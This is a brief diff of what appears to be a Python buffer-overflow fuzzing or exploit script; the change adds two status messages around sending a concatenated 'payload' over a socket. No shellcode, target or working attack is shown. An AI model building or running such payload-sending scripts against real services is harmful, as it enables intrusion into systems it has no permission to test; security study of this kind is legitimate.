@@ -25,5 +25,7 @@ increment = buffer
 #         sys.exit()
 
 payload = string + buffer
+print("[+] Sending payload..")
 s.send(payload)
+print("[+] Payload sent!")
 s.close()
